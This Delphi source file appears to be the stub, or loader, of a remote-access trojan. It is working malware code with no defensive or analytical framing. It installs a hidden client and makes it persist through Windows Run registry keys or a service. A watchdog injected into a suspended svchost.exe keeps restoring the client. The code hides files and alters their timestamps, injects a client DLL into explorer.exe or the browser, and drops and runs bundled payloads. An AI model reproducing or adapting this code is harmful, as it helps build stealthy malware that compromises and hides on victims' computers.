program Stub;

{$IMAGEBASE 13140000}

uses
  Windows,
  ShellAPI,
  Classes,
  UnitConstants,
  UnitStringEncryption,
  UnitFunctions,
  UnitInjectLibrary,
  UnitRegistryEditor,
  UnitConfiguration,
  UnitInstallation,
  UnitServices;

{$R ..\Resources\Client.RES}
     
function GetBrowser: string;
var
  B: array[0..255] of Char;
  Handle: Integer;
  Filename: string;
begin
  Filename := 'tmp.htm';
  Handle := Createfile(PChar(Filename),GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN, 0);
  CloseHandle(Handle);
  FindExecutable(PChar(Filename), '', B);
  DeleteFile(PChar(Filename));
  Result := B;
end;
       
function GetModuleFileNameExA(hProcess: THandle; hModule: HMODULE; lpFilename: PChar;
  nSize: DWORD): DWORD stdcall; external 'PSAPI.dll' name 'GetModuleFileNameExA';

function ProcessFileName(Pid: Cardinal): string;
var
  Handle: THandle;
begin
  Result := '';
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, Pid);
  if Handle <> 0 then
  try
    SetLength(Result, MAX_PATH);
    begin
      if GetModuleFileNameExA(Handle, 0, PChar(Result), MAX_PATH) > 0 then
        SetLength(Result, StrLen(PChar(Result)))
    end;
  finally
    CloseHandle(Handle);
  end;
end;
    
type
  PConfig = ^TConfig;
  TConfig = record
    ClientPath: string;
    MutexName, StartupKey, ServiceName, ServiceDesc: string;
    Startup, Hide, ChangeDate: Boolean;
    StartupOptions: Integer;
    HKCUStartup, HKLMStartup, PoliciesStartup: Boolean;
  end;

procedure InitPersistence(Config: PConfig); stdcall;
var
  ClientBuffer: string;
  BufferSize: Cardinal;
  PersistMutex, TmpMutex: THandle;
begin
  LoadLibrary('user32.dll');
  LoadLibrary('advapi32.dll');
  LoadLibrary('shell32.dll');
  LoadLibrary('shlwapi.dll');
  LoadLibrary('kernel32.dll');

  ClientBuffer := LoadFile(Config.ClientPath, BufferSize);
  PersistMutex := CreateMutex(nil, False, Pchar(Config.MutexName + '_PERSIST'));

  while True do
  begin
    if Config.Startup then
    begin
      if Config.StartupOptions = 0 then
      begin
        if Config.HKCUStartup then
        begin
          if ReadKeyString(HKEY_CURRENT_USER, PChar('Software\Microsoft\Windows\CurrentVersion\Run\'), Config.StartupKey, '') <> Config.ClientPath then
          AddRegValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\', Config.StartupKey, 'REG_SZ', Config.ClientPath);
        end;

        if Config.HKLMStartup then
        begin
          if ReadKeyString(HKEY_LOCAL_MACHINE, PChar('Software\Microsoft\Windows\CurrentVersion\Run\'), Config.StartupKey, '') <> Config.ClientPath then
          AddRegValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\', Config.StartupKey, 'REG_SZ', Config.ClientPath);
        end;

        if Config.PoliciesStartup then
        begin
          if ReadKeyString(HKEY_LOCAL_MACHINE, PChar('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\'), Config.StartupKey, '') <> Config.ClientPath then
          AddRegValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\', Config.StartupKey, 'REG_SZ', Config.ClientPath);
        end;
      end
      else
      begin
        InstallService(Config.ServiceName, Config.ServiceName, Config.ClientPath,
          Config.ServiceDesc, 2);
      end;
    end;

    if (FileExists(Config.ClientPath) = False) or (MyGetFileSize(Config.ClientPath) <> BufferSize) then
    begin
      MyDeleteFile(Config.ClientPath);
      CreatePath(ExtractFilePath(Config.ClientPath));
      CreateBinaryFile(Config.ClientPath, ClientBuffer, BufferSize);
      
      if (Config.ChangeDate = True) and (Config.ClientPath <> ParamStr(0)) then
      begin
        ChangeFileTime(Config.ClientPath);
        ChangeDirTime(ExtractFilepath(Config.ClientPath));
      end;

      if (Config.Hide = True) and (Config.ClientPath <> ParamStr(0)) then
      begin
        HideFileName(Config.ClientPath);
        HideFileName(ExtractFilepath(Config.ClientPath));
      end;
    end;

    TmpMutex := CreateMutex(nil, False, Pchar(Config.MutexName + ''));
    if GetLastError = ERROR_ALREADY_EXISTS then CloseHandle(TmpMutex) else
    begin
      CloseHandle(TmpMutex);
      Myshellexecute(Config.ClientPath, '', SW_HIDE);
    end;

    TmpMutex := CreateMutex(nil, False, Pchar(Config.MutexName + '_EXIT'));
    if GetLastError = ERROR_ALREADY_EXISTS then ExitProcess(0) else CloseHandle(TmpMutex);

    Sleep(5000);
  end;
end;
    
//p0ke mods by cswi
function GetResources(pSectionName: PChar; out ResourceSize: LongWord): Pointer;
var
  ResourceLocation: Cardinal;
  ResourceHandle: Cardinal;
begin
  ResourceLocation := FindResourceA(hInstance, PAnsiChar(pSectionName), PAnsiChar(10));
  ResourceSize := SizeofResource(hInstance, ResourceLocation);
  ResourceHandle := LoadResource(hInstance, ResourceLocation);
  Result := LockResource(ResourceHandle);
end;

//p0ke mods by cswi
function GetResourceAsString(pSectionName: pchar): string;
var
  ResourceData: PChar;
  SResourceSize: LongWord;
begin
  ResourceData := GetResources(pSectionName, SResourceSize);
  SetString(Result, ResourceData, SResourceSize);
end;

procedure LoadBindedFiles;
var
  Buffer: string;
  Filename, FilePath: string;
  FileSize: LongWord;
  Path, i: Integer;
  Execute: Boolean;
begin
  for i := 0 to StrToInt(GetResourceAsString('C')) -1 do
  begin
    Filename := GetResourceAsString(PChar('F' + IntToStr(i)));
    Path := StrToInt(GetResourceAsString(PChar('P' + IntTostr(i))));

    case Path of
      0: FilePath := WinDir + Filename;
      1: FilePath := SysDir + Filename;
      2: FilePath := TmpDir + Filename;
      3: FilePath := RootDir + Filename;
      4: FilePath := AppDataDir + Filename;
      5: FilePath := ProgramFilesDir + Filename;
    end;

    Execute := MyStrToBool(GetResourceAsString(PChar('E' + IntTostr(i)))) ;
    Buffer := GetResourceAsString(PChar('D' + IntToStr(i)));
    FileSize := StrToInt(GetResourceAsString(PChar('S' + IntTostr(i))));

    CreateBinaryFile(FilePath, Buffer, FileSize);
    if Execute then MyShellExecute(FilePath, '', 1);
  end;
end;

var
  TmpRes: TResourceStream;
  TmpMutex: THandle;
  ProcessPID: Integer;
  ProcessHandle, Pid: LongWord;
  ProcInfo: TProcessInformation;
  StartInfo: TStartupInfo;
  ClientBuffer: string;
  BufferSize: Cardinal;
  Config: TConfig;
  TmpStr: string;
  ClientPath, ClientDLL: string;
begin
  NoErrMsg := True;
  SetErrorMode(SEM_FAILCRITICALERRORS or SEM_NOALIGNMENTFAULTEXCEPT or SEM_NOGPFAULTERRORBOX or SEM_NOOPENFILEERRORBOX);

  TmpMutex := CreateMutex(nil, False, PChar(_MutexName + '_UPDATE'));
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    CloseHandle(TmpMutex);
    Sleep(10000);
  end
  else CloseHandle(TmpMutex);

  ClientPath := InstallClient;
  TmpStr := LoadConfiguration + '|' + ClientPath;
  TmpStr := EnDecryptString(TmpStr, PROGRAMPASSWORD);
  CreateTextFile(AppDataDir + 'tmpCfg', TmpStr);

  //Initialize TConfig record
  Config.ClientPath := ClientPath;
  Config.Startupkey := _StartupKey;
  Config.Startup := _Startup;
  Config.StartupOptions := _StartupOptions;
  Config.Hide := _Hide;
  Config.ChangeDate := _ChangeDate;
  Config.HKCUStartup := _HKCUStartup;
  Config.HKLMStartup := _HKLMStartup;
  Config.PoliciesStartup := _PoliciesStartup;
  Config.ServiceName := _ServiceName;
  Config.ServiceDesc := _ServiceDesc;

  CreateMutex(nil, False, PChar(_MutexName));
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    ExitProcess(0);
  end;

  ClientDll := AppDataDir + 'tmpClt.dll';
  if not FileExists(ClientDll) then
  begin
    TmpRes := TResourceStream.Create(HInstance, 'CLIENT', 'clientfile');
    TmpRes.SaveToFile(ClientDll);
    TmpRes.Free;
  end;

  ClientBuffer := LoadFile(ClientDll, BufferSize);

  if (_Install) and (_Persistence = True) then
  begin
    TmpMutex := CreateMutex(nil, False, PChar(_MutexName + '_PERSIST'));
    if GetLastError <> ERROR_ALREADY_EXISTS then
    begin
      CloseHandle(TmpMutex);
      ZeroMemory(@StartInfo, SizeOf(StartupInfo));
      ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
      CreateProcess(nil, 'svchost.exe', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      Processhandle := ProcInfo.hProcess;
      InjectPointerFunction(ProcessHandle, @InitPersistence, @Config);
    end
    else CloseHandle(TmpMutex);
  end;

  if _InjectInto = 'Explorer' then
  begin
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
    CreateProcess(nil, 'explorer.exe', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    Processhandle := ProcInfo.hProcess;
    if InjectPointerLibrary(ProcessHandle, @ClientBuffer[1]) = False then
    begin
      _InjectInto := ParamStr(0);
      ZeroMemory(@StartInfo, SizeOf(StartupInfo));
      ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
      CreateProcess(PChar(_InjectInto), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      Processhandle := ProcInfo.hProcess;
      InjectPointerLibrary(ProcessHandle, @ClientBuffer[1]);
    end;
  end
  else

  if _InjectInto = 'Default browser' then
  begin
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
    CreateProcess(PChar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    Processhandle := ProcInfo.hProcess;
    if InjectPointerLibrary(ProcessHandle, @ClientBuffer[1]) = False then
    begin
      _InjectInto := ParamStr(0);
      ZeroMemory(@StartInfo, SizeOf(StartupInfo));
      ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
      CreateProcess(PChar(_InjectInto), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      Processhandle := ProcInfo.hProcess;
      InjectPointerLibrary(ProcessHandle, @ClientBuffer[1]);
    end;
  end
  else

  if _InjectInto = 'No injection' then
  begin
    _InjectInto := ParamStr(0);
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
    CreateProcess(PChar(_InjectInto), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    Processhandle := ProcInfo.hProcess;
    InjectPointerLibrary(ProcessHandle, @ClientBuffer[1]);
  end
  else
  begin
    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
    CreateProcess(nil, PChar(_InjectInto), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    Processhandle := ProcInfo.hProcess;
    if InjectPointerLibrary(ProcessHandle, @ClientBuffer[1]) = False then
    begin
      if ProcessExists(_InjectInto, ProcessPID) = True then
        _InjectInto := ProcessFileName(ProcessPID)
      else _InjectInto := ParamStr(0);

      ZeroMemory(@StartInfo, SizeOf(StartupInfo));
      ZeroMemory(@ProcInfo, SizeOf(ProcInfo));
      CreateProcess(PChar(_InjectInto), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      Processhandle := ProcInfo.hProcess;
      InjectPointerLibrary(ProcessHandle, @ClientBuffer[1]);
    end;
  end;

  if _Binded then StartThread(@LoadBindedFiles);
  if FileExists(ClientDll) then MyDeleteFile(PChar(ClientDll));
end.
